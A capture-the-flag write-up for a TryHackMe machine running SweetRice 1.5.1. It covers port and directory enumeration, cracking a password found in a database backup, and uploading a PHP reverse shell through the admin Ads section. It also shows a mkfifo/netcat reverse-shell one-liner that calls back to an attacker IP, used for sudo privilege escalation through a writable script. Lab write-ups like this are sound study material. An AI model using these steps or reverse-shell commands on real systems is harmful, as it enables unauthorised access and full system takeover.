## Info
- Platform: TryHackMe  

---

## Enumeration

### Nmap
<img width="1389" height="479" alt="image" src="https://github.com/user-attachments/assets/8a8c80d4-b10a-4386-87d9-41ca14ccdc5c" />

- Open ports: 22 (SSH) and 80 (HTTP).

---

### Gobuster
<img width="1833" height="431" alt="image" src="https://github.com/user-attachments/assets/9d35d008-3430-4967-9e01-13f0309e879f" />

- `/content` directory was found.

---

## Exploitation

### Finding credentials in backup
<img width="1448" height="549" alt="image" src="https://github.com/user-attachments/assets/1ba0a7e5-390c-40cb-95b5-accde05efe8d" />

- Inside `/content/inc/` there was a `mysqlbackup` file.
<br><br>
- In the dump a `manager` entry contained an MD5 password hash:

<img width="716" height="84" alt="image" src="https://github.com/user-attachments/assets/3df9a70c-c375-47f9-b3d2-f1dc5830d230" />
<br><br>

- Using a hash DB (CrackStation) the plaintext was recovered:

```bash
Password123
```

---

### Logging into admin (SweetRice v1.5.1)
<img width="1919" height="746" alt="image" src="https://github.com/user-attachments/assets/3c4834af-db1c-4d51-a400-09d5a966c4f1" />

- Logged into the SweetRice admin panel using `manager:Password123`.
- Found `Ads` section where custom ad code can be added.

---

<img width="1919" height="591" alt="image" src="https://github.com/user-attachments/assets/ddbf8bed-af71-4dfa-be11-125aaa8165ae" />

- I added a PHP reverse shell into Ads (saved to `/content/inc/ads/php_reverse_shell.php`).
<br><br>
- Started a listener on my machine:
```bash
nc -lvnp 1234
```
<br><br>
<img width="1919" height="816" alt="image" src="https://github.com/user-attachments/assets/34b8b2dc-0f52-43f4-99aa-9fef8bb7f3be" />

- Triggered the uploaded ad file/URL and received a shell as `www-data`.

---

### First Flag
<img width="570" height="132" alt="1" src="https://github.com/user-attachments/assets/9d189865-de68-4578-a33b-c62f108e7158" />

- Flag found: `[FLAG FOUND]`

---

## Privilege Escalation

### Checking sudo rights
<img width="1559" height="125" alt="image" src="https://github.com/user-attachments/assets/c8e53644-d0a1-45c7-9e79-5336eed9037a" />

- On the `www-data` shell:
```bash
sudo -l
```
- Output:
```bash
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

---

### Abusing backup.pl
- `backup.pl` executes `/home/itguy/copy.sh` as part of its routine.
- I replaced `copy.sh` with a reverse-shell payload that connects back to my machine, started a listener, then executed the allowed sudo command to trigger it.
```bash
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.4.114 4444 > /tmp/f' > /home/itguy/copy.sh
# on target:
sudo /usr/bin/perl /home/itguy/backup.pl
```

---

### Second Flag
<img width="523" height="116" alt="f75e29c2-2aa5-4b3d-ab0d-7106b72850e0" src="https://github.com/user-attachments/assets/db44ac0f-0763-4ab8-9cb9-876888e7e454" />

- Flag found: `[FLAG FOUND]`
